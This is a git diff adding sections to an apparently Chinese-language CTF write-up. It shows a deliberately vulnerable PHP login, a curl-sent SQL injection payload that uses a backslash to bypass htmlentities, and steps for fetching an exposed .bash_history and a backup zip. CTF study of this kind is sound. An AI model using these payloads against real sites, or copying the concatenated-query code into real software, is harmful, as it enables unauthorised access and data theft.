@@ -368,6 +368,68 @@ else
 ```shell
 curl http://chinalover.sinaapp.com/web12/index.php?key=0xccccccccc
 ```
+
+## [SQL Injection](http://chinalover.sinaapp.com/web15/index.php)
+先通过curl看一下有没有源代码`curl http://chinalover.sinaapp.com/web15/index.php -v`
+```php
+#GOAL: login as admin,then get the flag;
+error_reporting(0);
+require 'db.inc.php';
+
+function clean($str){
+  if(get_magic_quotes_gpc()){
+    $str=stripslashes($str);
+  }
+  return htmlentities($str, ENT_QUOTES);
+}
+
+$username = @clean((string)$_GET['username']);
+$password = @clean((string)$_GET['password']);
+
+$query='SELECT * FROM users WHERE name=\''.$username.'\' AND pass=\''.$password.'\';';
+$result=mysql_query($query);
+if(!$result || mysql_num_rows($result) < 1){
+        die('Invalid password!');
+}
+
+echo $flag;
+```
+
+一开始以为目标是注释掉SQL的pass条件，试了几次没有结果之后谷歌了一下，发现目标搞错了。`htmlentities` 始终会把单引号用 html 实体编码，因此无法通过输入单引号来实现闭合的目的。
+```php
+$query='SELECT * FROM users WHERE name=\''.$username.'\' AND pass=\''.$password.'\'
+```
+一番谷歌之后，留意到SQL语句有4个单引号。输入单引号闭合第一个的方法行不通，但是可以尝试让后面已经存在的第三个单引号闭合第一个，这就需要用到反斜杠转义来消除第二个单引号，同时使用注释无视最后一个单引号。目标SQL长类似这样：
+
+```sql
+SELECT * FROM users WHERE name='25252\' AND pass=' or 1=1 -- a';
+```
+
+```shell
+curl 'http://chinalover.sinaapp.com/web15/index.php?username=25252%5C&password=%20or%201%3D1%20--%20a'
+```
+
+需要注意下因为有`stripslashes`的存在，如果`get_magic_quotes_gpc()`为1，就需要再多给一个反斜杠；目前来说，`get_magic_quotes_gpc()`的值应该是0。
+
+## [综合](http://teamxlc.sinaapp.com/web3/b0b0ad119f425408fc3d45253137d33d/index.php)
+
+点击链接进入题目，发现页面上有一堆中括号和运算符。第一次看到时我整个人是懵的；谷歌说这叫 [jsfuck](https://zh.wikipedia.org/wiki/JSFuck)，是一种混淆JS代码的方式。把页面上面那一堆符号复制一下，打开chrome的控制台粘贴并回车，得到一个字符串`1bc29b36f623ba82aaf6724fd3b16718.php`。
+
+看起来这是一个页面的名字。尝试打开看一下 `curl http://teamxlc.sinaapp.com/web3/b0b0ad119f425408fc3d45253137d33d/1bc29b36f623ba82aaf6724fd3b16718.php -v`。页面提示“TIP在我脑袋里”：仔细看curl的响应会发现多出来一个header名叫 `tip`，值为 `history of bash`。
+
+貌似类 unix 系统在当前用户文件夹`~`下面有一个叫`.bash_history`的文件，这个文件由 bash 创建、被用来存储用户执行过的命令。这里既然有提示，就看一下会有啥 
+```shell
+curl http://teamxlc.sinaapp.com/web3/b0b0ad119f425408fc3d45253137d33d/.bash_history -v
+```
+
+结果显示有一个记录是 `zip -r flagbak.zip ./*`。试着访问一下 flagbak.zip，会发现答案就在这里：
+
+```shell
+wget http://teamxlc.sinaapp.com/web3/b0b0ad119f425408fc3d45253137d33d/flagbak.zip
+unzip flagbak.zip
+cat flag.txt
+```
+
 ## [综合2](http://cms.nuptzj.cn/)
 
 页面上有个链接`/about.php?file=`，应该是有本地文件包含漏洞。看一下`/about.php`的源代码。因为有一些实体编码的内容，所以要先解码。
@@ -577,8 +639,10 @@ curl http://chinalover.sinaapp.com/web24/?name=meizijiu233
   - GBK injection
     - [1st character](https://zh.wikipedia.org/wiki/%E6%B1%89%E5%AD%97%E5%86%85%E7%A0%81%E6%89%A9%E5%B1%95%E8%A7%84%E8%8C%83#%E7%BC%96%E7%A0%81%E6%96%B9%E5%BC%8F)
     - [post](https://lyiang.wordpress.com/2015/06/09/sql%E6%B3%A8%E5%85%A5%EF%BC%9A%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5%EF%BC%88gbk%E5%8F%8C%E5%AD%97%E8%8A%82%E7%BB%95%E8%BF%87%EF%BC%89/) about php `addslashes` and mysql `character_set_client`
-- `curl`
-  - post an array in form data via [`curl`](https://stackoverflow.com/a/22741771/8706476)
+- unix
+  - `curl`
+    - post an array in form data via [`curl`](https://stackoverflow.com/a/22741771/8706476)
+  - `.bash_history`
 - http
   - headers
     - `X-Forwarded-For`
